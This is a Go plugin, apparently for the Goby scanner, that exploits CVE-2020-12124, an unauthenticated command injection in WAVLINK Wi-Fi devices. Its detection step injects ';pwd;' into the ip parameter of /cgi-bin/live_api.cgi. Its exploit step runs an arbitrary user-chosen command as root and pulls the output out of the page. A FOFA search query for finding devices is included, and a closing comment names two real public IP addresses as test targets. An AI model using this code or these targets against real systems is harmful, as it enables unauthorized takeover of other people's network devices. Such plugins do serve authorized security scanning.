package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "fmt"
  "strings"
  "net/url"
)

func init() {
	expJson := `{
    "Name": "WAVLINK Wi-Fi APP RCE (CVE-2020-12124)",
    "Description": "<p>The unauthenticated endpoint in the WAVLINK  Wi-Fi APP, /cgi-bin/live_api.cgi,contained a command line injection vulnerability that allowed unauthenticated users to execute arbitrary shell commands.</p>",
    "Product": "Wi-Fi APP",
    "Homepage": "https://www.wavlink.com/en_us/index.html",
    "DisclosureDate": "2020-04-23",
    "Author": "gonosecto@protonmail.com",
    "FofaQuery": "title=\"Wi-Fi APP Login\"",
    "GobyQuery": "title=\"Wi-Fi APP Login\"",
    "Level": "3",
    "Impact": "<p>A remote command-line injection vulnerability in the /cgi-bin/live_api.cgi endpoint of the Wi-Fi APP allows an attacker to execute arbitrary Linux commands as root without authentication.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.wavlink.com/en_us/index.html\">https://www.wavlink.com/en_us/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cerne.xyz/bugs/cve-2020-12124"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND"
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2020-12124"
    ],
    "CNNVD": [
        "CNNVD-202010-052"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WAVLINK Wi-Fi APP 命令执行漏洞（CVE-2020-12124）",
            "Product": "Wi-Fi APP",
            "Description": "<p>睿因（wavlink）多个Wi-Fi APP产品存在命令执行漏洞。命令注入点存在于/cgi-bin/live-api.cgi的ip参数，未经身份验证的攻击者可利用该漏洞以root权限执行任意系统命令。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.wavlink.com/en_us/index.html\">https://www.wavlink.com/en_us/index.html</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>未经身份验证的攻击者可利用该漏洞以root权限执行任意系统命令，进而获取系统权限，控制整个系统。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "WAVLINK Wi-Fi APP RCE (CVE-2020-12124)",
            "Product": "Wi-Fi APP",
            "Description": "<p>The unauthenticated endpoint in the WAVLINK&nbsp; Wi-Fi APP,&nbsp;<code>/cgi-bin/live_api.cgi</code>,contained a command line injection vulnerability that allowed unauthenticated users to execute arbitrary shell commands.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.wavlink.com/en_us/index.html\">https://www.wavlink.com/en_us/index.html</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>A remote command-line injection vulnerability in the /cgi-bin/live_api.cgi endpoint of the Wi-Fi APP allows an attacker to execute arbitrary Linux commands as root without authentication.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      cfg := httpclient.NewGetRequestConfig("/cgi-bin/live_api.cgi?page=abc&id=173&ip=;pwd;")
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/etc_ro/lighttpd/www/cgi-bin")
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)
      encodecmd :=url.QueryEscape(cmd)
      uri := fmt.Sprintf("/cgi-bin/live_api.cgi?page=abc&id=173&ip=;%s;", encodecmd)
      cfg := httpclient.NewGetRequestConfig(uri)
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
        if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "get_cli_signal") {
          expResult.Output = strings.Split(strings.Split(resp.Utf8Html,"var get_cli_signal;\n")[1],"\nfunction")[0]
          expResult.Success = true
        }
      }
      return expResult
    },
  ))
}
//test vul:http://58.153.122.108,http://65.20.166.217